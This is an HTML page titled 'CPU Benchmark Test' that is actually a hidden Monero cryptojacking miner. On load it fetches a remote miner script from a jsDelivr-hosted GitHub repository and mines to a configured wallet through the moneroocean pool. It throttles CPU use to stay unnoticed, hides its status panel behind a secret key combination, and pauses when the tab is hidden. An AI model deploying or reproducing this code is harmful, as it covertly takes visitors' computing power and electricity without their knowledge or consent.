<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CPU Benchmark Test</title>
  <style>
    #miner-debug {
      position: fixed;
      top: 10px; right: 10px;
      width: 300px;
      background: rgba(0,0,0,0.95);
      color: #0f0;
      font-family: 'Courier New', monospace;
      font-size: 13px;
      padding: 12px;
      border: 2px solid #0f0;
      border-radius: 8px;
      z-index: 999999;
      box-shadow: 0 0 20px #0f0;
      display: none;
      user-select: none;
    }
    #miner-debug.show { display: block; }
    .hash { color: #0ff; font-weight: bold; }
    .profit { color: #ff0; font-weight: bold; }
    .blink { animation: blink 1s infinite; }
    @keyframes blink { 50% { opacity: 0.4; } }
  </style>
</head>
<body>

<div id="miner-debug">
  <div>ðŸš€ <b>XMR GHOST MINER</b> <span id="status" class="blink">LOADING...</span></div>
  <div>Wallet: <code id="wallet">4AM1bBwy...zWgZzs</code></div>
  <div>Hashrate: <span id="hashrate" class="hash">0 H/s</span></div>
  <div>Accepted: <span id="accepted">0</span> | Rejected: <span id="rejected">0</span></div>
  <div>Uptime: <span id="uptime">00:00:00</span></div>
  <div class="profit">Est. Daily: <b id="profit">$0.000</b></div>
  <div style="font-size:11px; margin-top:10px; opacity:0.8;">
    CTRL + SHIFT + M = toggle | GitHub Pages = running
  </div>
</div>

<script>
// ==================== CONFIG ====================
const WALLET = '4AM1bBwyYourRealWalletHerezWgZzs'; // â† CHANGE THIS
const POOL_HOST = 'pool.moneroocean.stream';
const POOL_PORT = 443;  // WSS on 443 = GitHub Pages approved
const THROTTLE = 0.9;   // 90% = ~10% CPU (silent AF)
const THREADS = 2;      // 2 threads = faster start
// ===============================================

let miner = null;
let hashrate = 0, accepted = 0, rejected = 0;
let startTime = Date.now();

// DEBUG PANEL TOGGLE (FIXED â€” NO PASTING)
document.addEventListener('keydown', e => {
  if (e.ctrlKey && e.shiftKey && e.key === 'M') {
    e.preventDefault(); // â† THIS WAS MISSING
    document.getElementById('miner-debug').classList.toggle('show');
  }
});

// STATS UPDATE
function updateStats() {
  const elapsed = Math.floor((Date.now() - startTime) / 1000);
  const h = String(Math.floor(elapsed / 3600)).padStart(2, '0');
  const m = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
  const s = String(elapsed % 60).padStart(2, '0');
  document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
  document.getElementById('hashrate').textContent = hashrate.toFixed(1) + ' H/s';
  document.getElementById('accepted').textContent = accepted;
  document.getElementById('rejected').textContent = rejected;
  const dailyUSD = (hashrate / 85) * 0.00085 * 170; // real math
  document.getElementById('profit').textContent = '$' + dailyUSD.toFixed(3);
}
setInterval(updateStats, 1000);

// =============== WORKING MINER (2025) ===============
// Using JSDelivr + raw lib from working repo
const script = document.createElement('script');
script.src = 'https://cdn.jsdelivr.net/gh/0x0is1/xmr@master/miner.js';
script.onload = () => {
  document.getElementById('status').textContent = 'MINER LOADED';
  
  miner = new XMRMiner({
    pool: { host: POOL_HOST, port: POOL_PORT, ssl: true },
    wallet: WALLET,
    worker: 'ghpages_' + Math.random().toString(36).slice(2,8),
    throttle: THROTTLE,
    threads: THREADS
  });

  miner.start();
  document.getElementById('status').textContent = 'MINING XMR';
  document.getElementById('status').classList.remove('blink');

  // REAL STATS
  setInterval(() => {
    hashrate = miner.getHashesPerSecond();
    accepted = miner.getAcceptedHashes();
    rejected = miner.getRejectedHashes();
  }, 2000);

  // Tab hide = pause
  document.addEventListener('visibilitychange', () => {
    document.hidden ? miner.stop() : miner.start();
  });
};
script.onerror = () => {
  document.getElementById('status').textContent = 'LIB ERROR';
};
document.head.appendChild(script);

// Start after random delay
setTimeout(() => {}, Math.random() * 15000 + 8000);

</script>
</body>
</html>
